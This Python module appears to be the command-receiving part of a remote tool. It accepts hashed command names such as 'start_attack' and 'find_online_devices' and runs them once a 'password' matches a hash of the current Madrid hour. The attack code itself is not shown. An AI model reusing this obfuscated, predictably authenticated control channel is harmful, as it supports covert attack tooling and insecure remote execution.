import hashlib
from datetime import datetime
import pytz

from src.utils.CommandExecutor import CommandExecutor


def encrypt_text(text, algorithm='sha512'):
    try:
        text_bytes = text.encode('utf-8')

        hash_algorithms = {
            'sha256': hashlib.sha256,
            'sha384': hashlib.sha384,
            'sha224': hashlib.sha224,
            'blake2b': hashlib.blake2b,
            'blake2s': hashlib.blake2s,
            'sha512': hashlib.sha512
        }

        if algorithm in hash_algorithms:
            hash_func = hash_algorithms[algorithm]
            return hash_func(text_bytes).hexdigest()
        else:
            return "Algoritmo no soportado"
    except UnicodeEncodeError as e:
        print(f"Error de codificación Unicode: {e}")
        return f"Error de codificación Unicode: {e}"


class InputChecker:

    @staticmethod
    def validate_input_command(input_text):
        input_data_array = input_text.split(";")

        if len(input_data_array) != 0:
            input_password_encrypted = input_data_array.pop(0)
            valid_password_encrypted = encrypt_text(InputChecker.get_date_time())

            command_encrypted = input_data_array.pop(0)
            command = CommandReader.recognize(command_encrypted)

            arguments = input_data_array.copy()

            if (input_password_encrypted == valid_password_encrypted
                    and CommandReader.validate_arguments(arguments)):
                CommandExecutor.execute_command(command, arguments)

    @staticmethod
    def get_date_time():
        now = datetime.now(pytz.timezone('Europe/Madrid'))
        formatted_date_time = now.strftime('%d%m%Y%H').replace("0", "")

        return formatted_date_time


class CommandReader:
    commands = [
        "find_online_devices",
        "start_attack",
        "placeholder_command"
    ]

    @classmethod
    def recognize(cls, command):
        for c in cls.commands:
            hash_hex = encrypt_text(c)
            if hash_hex == command:
                return c

    @staticmethod
    def validate_arguments(arguments):
        return len(arguments) > 0
        # TODO
